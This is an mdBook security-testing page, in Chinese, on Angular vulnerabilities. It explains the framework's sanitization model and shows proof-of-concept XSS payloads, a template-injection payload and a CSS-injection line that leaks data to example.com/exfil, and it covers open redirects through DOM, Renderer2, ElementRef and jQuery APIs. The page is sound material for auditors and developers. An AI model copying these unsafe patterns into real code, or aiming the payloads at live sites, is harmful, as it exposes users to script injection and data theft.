<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Angular</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="angular"><a class="header" href="#angular">Angular</a></h1>
<h2 id="the-checklist"><a class="header" href="#the-checklist">The Checklist</a></h2>
<p>Checklist <a href="https://lsgeurope.com/post/angular-security-checklist">from here</a>.</p>
<ul>
<li><input disabled="" type="checkbox"/>
Angular 被认为是一个客户端框架，不期望提供服务器端保护</li>
<li><input disabled="" type="checkbox"/>
项目配置中禁用了脚本的源映射</li>
<li><input disabled="" type="checkbox"/>
不可信的用户输入在用于模板之前始终被插值或清理</li>
<li><input disabled="" type="checkbox"/>
用户无法控制服务器端或客户端模板</li>
<li><input disabled="" type="checkbox"/>
不可信的用户输入在被应用程序信任之前，使用适当的安全上下文进行清理</li>
<li><input disabled="" type="checkbox"/>
<code>BypassSecurity*</code> 方法不与不可信输入一起使用</li>
<li><input disabled="" type="checkbox"/>
不可信的用户输入不传递给 Angular 类，如 <code>ElementRef</code>、<code>Renderer2</code> 和 <code>Document</code>，或其他 JQuery/DOM 接收器</li>
</ul>
<h2 id="what-is-angular"><a class="header" href="#what-is-angular">What is Angular</a></h2>
<p>Angular 是一个 <strong>强大</strong> 和 <strong>开源</strong> 的前端框架，由 <strong>Google</strong> 维护。它使用 <strong>TypeScript</strong> 来增强代码的可读性和调试能力。凭借强大的安全机制，Angular 防止常见的客户端漏洞，如 <strong>XSS</strong> 和 <strong>开放重定向</strong>。它也可以在 <strong>服务器端</strong> 使用，因此从 <strong>两个角度</strong> 考虑安全性非常重要。</p>
<h2 id="framework-architecture"><a class="header" href="#framework-architecture">Framework architecture</a></h2>
<p>为了更好地理解 Angular 的基础知识，让我们了解其基本概念。</p>
<p>常见的 Angular 项目通常看起来像：</p>
<pre><code class="language-bash">my-workspace/
├── ... #workspace-wide configuration files
├── src
│   ├── app
│   │   ├── app.module.ts #defines the root module, that tells Angular how to assemble the application
│   │   ├── app.component.ts #defines the logic for the application's root component
│   │   ├── app.component.html #defines the HTML template associated with the root component
│   │   ├── app.component.css #defines the base CSS stylesheet for the root component
│   │   ├── app.component.spec.ts #defines a unit test for the root component
│   │   └── app-routing.module.ts #provides routing capability for the application
│   ├── lib
│   │   └── src #library-specific configuration files
│   ├── index.html #main HTML page, where the component will be rendered in
│   └── ... #application-specific configuration files
├── angular.json #provides workspace-wide and project-specific configuration defaults
└── tsconfig.json #provides the base TypeScript configuration for projects in the workspace
</code></pre>
<p>根据文档，每个 Angular 应用程序至少有一个组件，即根组件 (<code>AppComponent</code>)，它将组件层次结构与 DOM 连接。每个组件定义一个包含应用程序数据和逻辑的类，并与定义要在目标环境中显示的视图的 HTML 模板相关联。<code>@Component()</code> 装饰器将其下方的类标识为组件，并提供模板和相关的组件特定元数据。<code>AppComponent</code> 在 <code>app.component.ts</code> 文件中定义。</p>
<p>Angular NgModules 声明一个编译上下文，用于一组专用于应用程序域、工作流或紧密相关功能的组件。每个 Angular 应用程序都有一个根模块，通常命名为 <code>AppModule</code>，它提供启动机制以启动应用程序。一个应用程序通常包含多个功能模块。<code>AppModule</code> 在 <code>app.module.ts</code> 文件中定义。</p>
<p>Angular <code>Router</code> NgModule 提供一个服务，让您可以定义应用程序中不同状态和视图层次结构之间的导航路径。<code>RouterModule</code> 在 <code>app-routing.module.ts</code> 文件中定义。</p>
<p>对于不与特定视图相关联的数据或逻辑，并且您希望在组件之间共享的，您可以创建一个服务类。服务类定义前面会有 <code>@Injectable()</code> 装饰器。该装饰器提供元数据，允许其他提供者作为依赖项注入到您的类中。依赖注入 (DI) 使您能够保持组件类的精简和高效。它们不会从服务器获取数据、验证用户输入或直接记录到控制台；它们将此类任务委托给服务。</p>
<h2 id="sourcemap-配置"><a class="header" href="#sourcemap-配置">Sourcemap 配置</a></h2>
<p>Angular 框架通过遵循 <code>tsconfig.json</code> 选项将 TypeScript 文件转换为 JavaScript 代码，然后使用 <code>angular.json</code> 配置构建项目。查看 <code>angular.json</code> 文件时，我们观察到一个选项可以启用或禁用 sourcemap。根据 Angular 文档，默认配置为脚本启用了 sourcemap 文件，并且默认情况下不隐藏：</p>
<pre><code class="language-json">"sourceMap": {
"scripts": true,
"styles": true,
"vendor": false,
"hidden": false
}
</code></pre>
<p>一般来说，sourcemap 文件用于调试目的，因为它们将生成的文件映射到其原始文件。因此，不建议在生产环境中使用它们。如果启用 sourcemaps，它可以提高可读性并通过复制 Angular 项目的原始状态来帮助文件分析。然而，如果它们被禁用，审查者仍然可以通过搜索反安全模式手动分析编译后的 JavaScript 文件。</p>
<p>此外，带有 Angular 项目的编译 JavaScript 文件可以在浏览器开发者工具 → Sources（或 Debugger 和 Sources）→ [id].main.js 中找到。根据启用的选项，该文件末尾可能包含以下行 <code>//# sourceMappingURL=[id].main.js.map</code>，如果 <strong>hidden</strong> 选项设置为 <strong>true</strong>，则可能不包含此行。尽管如此，如果 <strong>scripts</strong> 的 sourcemap 被禁用，测试变得更加复杂，我们无法获取该文件。此外，sourcemap 可以在项目构建期间启用，例如 <code>ng build --source-map</code>。</p>
<h2 id="数据绑定"><a class="header" href="#数据绑定">数据绑定</a></h2>
<p>绑定是指组件与其对应视图之间的通信过程。它用于在 Angular 框架中传输数据。数据可以通过多种方式传递，例如通过事件、插值、属性或通过双向绑定机制。此外，数据还可以在相关组件（父子关系）之间以及在两个不相关的组件之间使用服务功能进行共享。</p>
<p>我们可以通过数据流对绑定进行分类：</p>
<ul>
<li>数据源到视图目标（包括 <em>插值</em>、<em>属性</em>、<em>属性</em>、<em>类</em> 和 <em>样式</em>）；可以通过在模板中使用 <code>[]</code> 或 <code>{{}}</code> 来应用；</li>
<li>视图目标到数据源（包括 <em>事件</em>）；可以通过在模板中使用 <code>()</code> 来应用；</li>
<li>双向；可以通过在模板中使用 <code>[()]</code> 来应用。</li>
</ul>
<p>绑定可以在属性、事件和属性上调用，以及在源指令的任何公共成员上调用：</p>
<div class="table-wrapper"><table><thead><tr><th>类型</th><th>目标</th><th>示例</th></tr></thead><tbody>
<tr><td>属性</td><td>元素属性、组件属性、指令属性</td><td>&lt;img [alt]="hero.name" [src]="heroImageUrl"&gt;</td></tr>
<tr><td>事件</td><td>元素事件、组件事件、指令事件</td><td>&lt;button type="button" (click)="onSave()"&gt;保存</td></tr>
<tr><td>双向</td><td>事件和属性</td><td>&lt;input [(ngModel)]="name"&gt;</td></tr>
<tr><td>属性</td><td>属性（例外）</td><td>&lt;button type="button" [attr.aria-label]="help"&gt;帮助</td></tr>
<tr><td>类</td><td>类属性</td><td>&lt;div [class.special]="isSpecial"&gt;特殊</td></tr>
<tr><td>样式</td><td>样式属性</td><td>&lt;button type="button" [style.color]="isSpecial ? 'red' : 'green'"&gt;</td></tr>
</tbody></table>
</div>
<h2 id="angular-安全模型"><a class="header" href="#angular-安全模型">Angular 安全模型</a></h2>
<p>Angular 的设计默认对所有数据进行编码或清理，使得在 Angular 项目中发现和利用 XSS 漏洞变得越来越困难。数据处理有两种不同的场景：</p>
<ol>
<li>插值或 <code>{{user_input}}</code> - 执行上下文敏感编码并将用户输入解释为文本；</li>
</ol>
<pre><code class="language-jsx">//app.component.ts
test = "&lt;script&gt;alert(1)&lt;/script&gt;&lt;h1&gt;test&lt;/h1&gt;";

//app.component.html
{{test}}
</code></pre>
<p>结果： <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;h1&amp;gt;test&amp;lt;/h1&amp;gt;</code>
2.  绑定到属性、属性、类和样式或 <code>[attribute]="user_input"</code> - 根据提供的安全上下文执行清理。</p>
<pre><code class="language-jsx">//app.component.ts
test = "&lt;script&gt;alert(1)&lt;/script&gt;&lt;h1&gt;test&lt;/h1&gt;";

//app.component.html
&lt;div [innerHtml]="test"&gt;&lt;/div&gt;
</code></pre>
<p>结果： <code>&lt;div&gt;&lt;h1&gt;test&lt;/h1&gt;&lt;/div&gt;</code></p>
<p>有 6 种类型的 <code>SecurityContext</code>：</p>
<ul>
<li><code>None</code>；</li>
<li><code>HTML</code> 在将值解释为 HTML 时使用；</li>
<li><code>STYLE</code> 在将 CSS 绑定到 <code>style</code> 属性时使用；</li>
<li><code>URL</code> 用于 URL 属性，例如 <code>&lt;a href&gt;</code>；</li>
<li><code>SCRIPT</code> 用于 JavaScript 代码；</li>
<li><code>RESOURCE_URL</code> 作为加载并作为代码执行的 URL，例如在 <code>&lt;script src&gt;</code> 中。</li>
</ul>
<h2 id="漏洞"><a class="header" href="#漏洞">漏洞</a></h2>
<h3 id="绕过安全信任方法"><a class="header" href="#绕过安全信任方法">绕过安全信任方法</a></h3>
<p>Angular 引入了一系列方法来绕过其默认的清理过程，并指示某个值可以在特定上下文中安全使用，如以下五个示例所示：</p>
<ol>
<li><code>bypassSecurityTrustUrl</code> 用于指示给定值是安全的样式 URL：</li>
</ol>
<pre><code class="language-jsx">//app.component.ts
this.trustedUrl = this.sanitizer.bypassSecurityTrustUrl('javascript:alert()');

//app.component.html
&lt;a class="e2e-trusted-url" [href]="trustedUrl"&gt;点击我&lt;/a&gt;

//结果
&lt;a _ngcontent-pqg-c12="" class="e2e-trusted-url" href="javascript:alert()"&gt;点击我&lt;/a&gt;
</code></pre>
<ol start="2">
<li><code>bypassSecurityTrustResourceUrl</code> 用于指示给定值是安全的资源 URL：</li>
</ol>
<pre><code class="language-jsx">//app.component.ts
this.trustedResourceUrl = this.sanitizer.bypassSecurityTrustResourceUrl("https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png");

//app.component.html
&lt;iframe [src]="trustedResourceUrl"&gt;&lt;/iframe&gt;

//结果
&lt;img _ngcontent-nre-c12="" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png"&gt;
</code></pre>
<ol start="3">
<li><code>bypassSecurityTrustHtml</code> 用于指示给定值是安全的 HTML。请注意，以这种方式将 <code>script</code> 元素插入 DOM 树不会导致它们执行所包含的 JavaScript 代码，因为这些元素是如何添加到 DOM 树中的。</li>
</ol>
<pre><code class="language-jsx">//app.component.ts
this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml("&lt;h1&gt;html tag&lt;/h1&gt;&lt;svg onclick=\"alert('bypassSecurityTrustHtml')\" style=display:block&gt;blah&lt;/svg&gt;");

//app.component.html
&lt;p style="border:solid" [innerHtml]="trustedHtml"&gt;&lt;/p&gt;

//结果
&lt;h1&gt;html tag&lt;/h1&gt;
&lt;svg onclick="alert('bypassSecurityTrustHtml')" style="display:block"&gt;blah&lt;/svg&gt;
</code></pre>
<ol start="4">
<li><code>bypassSecurityTrustScript</code> 用于指示给定值是安全的 JavaScript。然而，我们发现其行为不可预测，因为我们无法使用此方法在模板中执行 JS 代码。</li>
</ol>
<pre><code class="language-jsx">//app.component.ts
this.trustedScript = this.sanitizer.bypassSecurityTrustScript("alert('bypass Security TrustScript')");

//app.component.html
&lt;script [innerHtml]="trustedScript"&gt;&lt;/script&gt;

//结果
-
</code></pre>
<ol start="5">
<li><code>bypassSecurityTrustStyle</code> 用于指示给定值是安全的 CSS。以下示例说明了 CSS 注入：</li>
</ol>
<pre><code class="language-jsx">//app.component.ts
this.trustedStyle = this.sanitizer.bypassSecurityTrustStyle('background-image: url(https://example.com/exfil/a)');

//app.component.html
&lt;input type="password" name="pwd" value="01234" [style]="trustedStyle"&gt;

//结果
请求 URL: GET example.com/exfil/a
</code></pre>
<p>Angular 提供了一个 <code>sanitize</code> 方法，在将数据显示在视图中之前对其进行清理。此方法使用提供的安全上下文并相应地清理输入。然而，使用特定数据和上下文的正确安全上下文至关重要。例如，在 HTML 内容上应用带有 <code>SecurityContext.URL</code> 的清理器并不能提供对危险 HTML 值的保护。在这种情况下，错误使用安全上下文可能导致 XSS 漏洞。</p>
<h3 id="html-注入"><a class="header" href="#html-注入">HTML 注入</a></h3>
<p>当用户输入绑定到以下三个属性中的任何一个时，就会发生此漏洞：<code>innerHTML</code>、<code>outerHTML</code> 或 <code>iframe</code> <code>srcdoc</code>。虽然绑定到这些属性会按原样解释 HTML，但输入使用 <code>SecurityContext.HTML</code> 进行清理。因此，HTML 注入是可能的，但跨站脚本（XSS）则不是。</p>
<p>使用 <code>innerHTML</code> 的示例：</p>
<pre><code class="language-jsx">//app.component.ts
import { Component} from '@angular/core';

@Component({
selector: 'app-root',
templateUrl: './app.component.html'
})
export class AppComponent{
//define a variable with user input
test = "&lt;script&gt;alert(1)&lt;/script&gt;&lt;h1&gt;test&lt;/h1&gt;";
}

//app.component.html
&lt;div [innerHTML]="test"&gt;&lt;/div&gt;
</code></pre>
<p>结果是 <code>&lt;div&gt;&lt;h1&gt;test&lt;/h1&gt;&lt;/div&gt;</code>。</p>
<h3 id="模板注入"><a class="header" href="#模板注入">模板注入</a></h3>
<h4 id="客户端渲染-csr"><a class="header" href="#客户端渲染-csr">客户端渲染 (CSR)</a></h4>
<p>Angular 利用模板动态构建页面。该方法涉及将模板表达式用双大括号（<code>{{}}</code>）括起来，以便 Angular 进行评估。通过这种方式，框架提供了额外的功能。例如，模板 <code>{{1+1}}</code> 将显示为 2。</p>
<p>通常，Angular 会转义可能与模板表达式混淆的用户输入（例如，字符如 `&lt; &gt; ' " `\）。这意味着需要额外的步骤来绕过此限制，例如利用生成 JavaScript 字符串对象的函数，以避免使用黑名单字符。然而，要实现这一点，我们必须考虑 Angular 的上下文、属性和变量。因此，模板注入攻击可能如下所示：</p>
<pre><code class="language-jsx">//app.component.ts
const _userInput = '{{constructor.constructor(\'alert(1)\'()}}'
@Component({
selector: 'app-root',
template: '&lt;h1&gt;title&lt;/h1&gt;' + _userInput
})
</code></pre>
<p>如上所示：<code>constructor</code>指的是对象<code>constructor</code>属性的作用域，使我们能够调用字符串构造函数并执行任意代码。</p>
<h4 id="服务器端渲染-ssr"><a class="header" href="#服务器端渲染-ssr">服务器端渲染 (SSR)</a></h4>
<p>与在浏览器的DOM中发生的CSR不同，Angular Universal负责模板文件的SSR。这些文件随后被传递给用户。尽管有这种区别，Angular Universal在SSR中应用了与CSR相同的清理机制，以增强SSR的安全性。在SSR中发现模板注入漏洞的方法与CSR相同，因为使用的模板语言是相同的。</p>
<p>当然，在使用第三方模板引擎如Pug和Handlebars时，也有可能引入新的模板注入漏洞。</p>
<h3 id="xss"><a class="header" href="#xss">XSS</a></h3>
<h4 id="dom接口"><a class="header" href="#dom接口">DOM接口</a></h4>
<p>如前所述，我们可以使用_Document_接口直接访问DOM。如果用户输入未经过验证，可能会导致跨站脚本（XSS）漏洞。</p>
<p>我们在下面的示例中使用了<code>document.write()</code>和<code>document.createElement()</code>方法：</p>
<pre><code class="language-jsx">//app.component.ts 1
import { Component} from '@angular/core';

@Component({
selector: 'app-root',
template: ''
})
export class AppComponent{
constructor () {
document.open();
document.write("&lt;script&gt;alert(document.domain)&lt;/script&gt;");
document.close();
}
}

//app.component.ts 2
import { Component} from '@angular/core';

@Component({
selector: 'app-root',
template: ''
})
export class AppComponent{
constructor () {
var d = document.createElement('script');
var y = document.createTextNode("alert(1)");
d.appendChild(y);
document.body.appendChild(d);
}
}

//app.component.ts 3
import { Component} from '@angular/core';

@Component({
selector: 'app-root',
template: ''
})
export class AppComponent{
constructor () {
var a = document.createElement('img');
a.src='1';
a.setAttribute('onerror','alert(1)');
document.body.appendChild(a);
}
}
</code></pre>
<h4 id="angular-类"><a class="header" href="#angular-类">Angular 类</a></h4>
<p>在 Angular 中，有一些类可以用于操作 DOM 元素：<code>ElementRef</code>、<code>Renderer2</code>、<code>Location</code> 和 <code>Document</code>。关于后两个类的详细描述在 <strong>Open redirects</strong> 部分中给出。前两个类的主要区别在于 <code>Renderer2</code> API 提供了一个抽象层，位于 DOM 元素和组件代码之间，而 <code>ElementRef</code> 仅持有对元素的引用。因此，根据 Angular 文档，<code>ElementRef</code> API 应仅在需要直接访问 DOM 时作为最后的手段使用。</p>
<ul>
<li><code>ElementRef</code> 包含属性 <code>nativeElement</code>，可用于操作 DOM 元素。然而，不当使用 <code>nativeElement</code> 可能导致 XSS 注入漏洞，如下所示：</li>
</ul>
<pre><code class="language-tsx">//app.component.ts
import { Component, ElementRef, ViewChild, AfterViewInit } from '@angular/core';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent {
...
constructor(private elementRef: ElementRef) {
const s = document.createElement('script');
s.type = 'text/javascript';
s.textContent = 'alert("Hello World")';
this.elementRef.nativeElement.appendChild(s);
}
}
</code></pre>
<ul>
<li>尽管 <code>Renderer2</code> 提供的 API 可以安全使用，即使在不支持直接访问本地元素的情况下，但它仍然存在一些安全缺陷。使用 <code>Renderer2</code>，可以通过 <code>setAttribute()</code> 方法在 HTML 元素上设置属性，而该方法没有 XSS 预防机制。</li>
</ul>
<pre><code class="language-tsx">//app.component.ts
import {Component, Renderer2, ElementRef, ViewChild, AfterViewInit } from '@angular/core';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent {

public constructor (
private renderer2: Renderer2
){}
@ViewChild("img") img!: ElementRef;

addAttribute(){
this.renderer2.setAttribute(this.img.nativeElement, 'src', '1');
this.renderer2.setAttribute(this.img.nativeElement, 'onerror', 'alert(1)');
}
}

//app.component.html
&lt;img #img&gt;
&lt;button (click)="setAttribute()"&gt;Click me!&lt;/button&gt;
</code></pre>
<ul>
<li>要设置 DOM 元素的属性，可以使用 <code>Renderer2.setProperty()</code> 方法并触发 XSS 攻击：</li>
</ul>
<pre><code class="language-tsx">//app.component.ts
import {Component, Renderer2, ElementRef, ViewChild, AfterViewInit } from '@angular/core';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent {

public constructor (
private renderer2: Renderer2
){}
@ViewChild("img") img!: ElementRef;

setProperty(){
this.renderer2.setProperty(this.img.nativeElement, 'innerHTML', '&lt;img src=1 onerror=alert(1)&gt;');
}
}

//app.component.html
&lt;a #a&gt;&lt;/a&gt;
&lt;button (click)="setProperty()"&gt;Click me!&lt;/button&gt;
</code></pre>
<p>在我们的研究中，我们还检查了其他 <code>Renderer2</code> 方法的行为，如 <code>setStyle()</code>、<code>createComment()</code> 和 <code>setValue()</code>，与 XSS 和 CSS 注入的关系。然而，由于这些方法的功能限制，我们未能找到有效的攻击向量。</p>
<h4 id="jquery"><a class="header" href="#jquery">jQuery</a></h4>
<p>jQuery 是一个快速、小巧且功能丰富的 JavaScript 库，可以在 Angular 项目中用于操作 HTML DOM 对象。然而，众所周知，该库的方法可能被利用以实现 XSS 漏洞。为了讨论一些易受攻击的 jQuery 方法如何在 Angular 项目中被利用，我们添加了这一小节。</p>
<ul>
<li><code>html()</code> 方法获取匹配元素集合中第一个元素的 HTML 内容，或设置每个匹配元素的 HTML 内容。然而，按设计，任何接受 HTML 字符串的 jQuery 构造函数或方法都可能执行代码。这可能通过注入 <code>&lt;script&gt;</code> 标签或使用执行代码的 HTML 属性来发生，如示例所示。</li>
</ul>
<pre><code class="language-tsx">//app.component.ts
import { Component, OnInit } from '@angular/core';
import * as $ from 'jquery';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent implements OnInit
{
ngOnInit()
{
$("button").on("click", function()
{
$("p").html("&lt;script&gt;alert(1)&lt;/script&gt;");
});
}
}

//app.component.html
&lt;button&gt;Click me&lt;/button&gt;
&lt;p&gt;some text here&lt;/p&gt;
</code></pre>
<ul>
<li><code>jQuery.parseHTML()</code> 方法使用本地方法将字符串转换为一组 DOM 节点，然后可以将其插入到文档中。</li>
</ul>
<pre><code class="language-tsx">jQuery.parseHTML(data [, context ] [, keepScripts ])
</code></pre>
<p>如前所述，大多数接受 HTML 字符串的 jQuery API 将运行包含在 HTML 中的脚本。<code>jQuery.parseHTML()</code> 方法不会运行解析 HTML 中的脚本，除非 <code>keepScripts</code> 显式为 <code>true</code>。然而，在大多数环境中，仍然可以间接执行脚本；例如，通过 <code>&lt;img onerror&gt;</code> 属性。</p>
<pre><code class="language-tsx">//app.component.ts
import { Component, OnInit } from '@angular/core';
import * as $ from 'jquery';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent implements OnInit
{
ngOnInit()
{
$("button").on("click", function()
{
var $palias = $("#palias"),
str = "&lt;img src=1 onerror=alert(1)&gt;",
html = $.parseHTML(str),
nodeNames = [];
$palias.append(html);
});
}
}

//app.component.html
&lt;button&gt;Click me&lt;/button&gt;
&lt;p id="palias"&gt;some text&lt;/p&gt;
</code></pre>
<h3 id="open-redirects"><a class="header" href="#open-redirects">Open redirects</a></h3>
<h4 id="dom-接口"><a class="header" href="#dom-接口">DOM 接口</a></h4>
<p>根据 W3C 文档，<code>window.location</code> 和 <code>document.location</code> 对象在现代浏览器中被视为别名。这就是为什么它们在某些方法和属性的实现上相似，这可能导致开放重定向和 DOM XSS 与 <code>javascript://</code> 架构攻击，如下所示。</p>
<ul>
<li><code>window.location.href</code>（和 <code>document.location.href</code>）</li>
</ul>
<p>获取当前 DOM 位置对象的规范方法是使用 <code>window.location</code>。它也可以用于将浏览器重定向到新页面。因此，控制该对象使我们能够利用开放重定向漏洞。</p>
<pre><code class="language-tsx">//app.component.ts
...
export class AppComponent {
goToUrl(): void {
window.location.href = "https://google.com/about"
}
}

//app.component.html
&lt;button type="button" (click)="goToUrl()"&gt;Click me!&lt;/button&gt;
</code></pre>
<p>以下场景的利用过程是相同的。</p>
<ul>
<li><code>window.location.assign()</code>（和 <code>document.location.assign()</code>）</li>
</ul>
<p>该方法使窗口加载并显示指定 URL 的文档。如果我们控制该方法，它可能是开放重定向攻击的一个入口。</p>
<pre><code class="language-tsx">//app.component.ts
...
export class AppComponent {
goToUrl(): void {
window.location.assign("https://google.com/about")
}
}
</code></pre>
<ul>
<li><code>window.location.replace()</code>（和 <code>document.location.replace()</code>）</li>
</ul>
<p>该方法用提供的 URL 替换当前资源。</p>
<p>与 <code>assign()</code> 方法的不同之处在于，使用 <code>window.location.replace()</code> 后，当前页面不会保存在会话历史中。然而，当我们控制该方法时，也可以利用开放重定向漏洞。</p>
<pre><code class="language-tsx">//app.component.ts
...
export class AppComponent {
goToUrl(): void {
window.location.replace("http://google.com/about")
}
}
</code></pre>
<ul>
<li><code>window.open()</code></li>
</ul>
<p><code>window.open()</code> 方法接受一个 URL，并将其识别的资源加载到新标签或窗口中。控制该方法也可能是触发 XSS 或开放重定向漏洞的机会。</p>
<pre><code class="language-tsx">//app.component.ts
...
export class AppComponent {
goToUrl(): void {
window.open("https://google.com/about", "_blank")
}
}
</code></pre>
<h4 id="angular-类-1"><a class="header" href="#angular-类-1">Angular 类</a></h4>
<ul>
<li>根据 Angular 文档，Angular <code>Document</code> 与 DOM 文档相同，这意味着可以使用通用向量来利用 Angular 中的客户端漏洞。<code>Document.location</code> 属性和方法可能是成功开放重定向攻击的入口，如示例所示：</li>
</ul>
<pre><code class="language-tsx">//app.component.ts
import { Component, Inject } from '@angular/core';
import { DOCUMENT } from '@angular/common';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent {
constructor(@Inject(DOCUMENT) private document: Document) { }

goToUrl(): void {
this.document.location.href = 'https://google.com/about';
}
}

//app.component.html
&lt;button type="button" (click)="goToUrl()"&gt;Click me!&lt;/button&gt;
</code></pre>
<ul>
<li>在研究阶段，我们还审查了 Angular <code>Location</code> 类的开放重定向漏洞，但未发现有效的向量。<code>Location</code> 是一个 Angular 服务，应用程序可以使用它与浏览器的当前 URL 进行交互。该服务有几个方法来操作给定的 URL - <code>go()</code>、<code>replaceState()</code> 和 <code>prepareExternalUrl()</code>。然而，我们无法使用它们进行重定向到外部域。例如：</li>
</ul>
<pre><code class="language-tsx">//app.component.ts
import { Component, Inject } from '@angular/core';
import {Location, LocationStrategy, PathLocationStrategy} from '@angular/common';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css'],
providers: [Location, {provide: LocationStrategy, useClass: PathLocationStrategy}],
})
export class AppComponent {
location: Location;
constructor(location: Location) {
this.location = location;
}
goToUrl(): void {
console.log(this.location.go("http://google.com/about"));
}
}
</code></pre>
<p>结果：<code>http://localhost:4200/http://google.com/about</code></p>
<ul>
<li>Angular <code>Router</code> 类主要用于在同一域内导航，并不会给应用程序引入任何额外的漏洞：</li>
</ul>
<pre><code class="language-jsx">//app-routing.module.ts
const routes: Routes = [
{ path: '', redirectTo: 'https://google.com', pathMatch: 'full' }]
</code></pre>
